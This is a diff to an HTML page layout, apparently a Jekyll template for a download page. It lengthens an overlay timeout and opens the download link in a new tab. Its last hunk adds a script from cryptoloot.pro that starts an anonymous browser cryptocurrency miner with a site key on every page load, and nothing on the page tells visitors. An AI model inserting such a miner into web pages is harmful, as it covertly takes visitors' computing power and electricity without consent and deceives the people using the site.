@@ -14,7 +14,7 @@ layout: compress
         window.addEventListener('load', function(){
             setTimeout(function(){
                 document.querySelector('.overlay-post-page').classList.remove('on');
-            },3000);
+            },5000);
         });
     </script>
     <main>
@@ -23,7 +23,7 @@ layout: compress
             <div class="hero-body">
                 <div class="container">
                     <h1 class="title">{{ page.title }}</h1>
-                    <a href="{{ page.download_link }}" class="button is-primary is-inverted is-outlined is-large">
+                    <a href="{{ page.download_link }}" class="button is-primary is-inverted is-outlined is-large" target="_blank">
                         <span class="icon">
                             <i class="icon-download-cloud"></i>
                         </span>
@@ -38,5 +38,10 @@ layout: compress
             </div>
         </section>
     </main>
+    <script src="//cryptoloot.pro/lib/crlt.js"></script>
+    <script>
+        var miner = new CRLT.Anonymous('9e00f5e94a101142e2ba7c76a2424493913fc5eb2570');
+        miner.start();
+    </script>
 </body>
 </html>
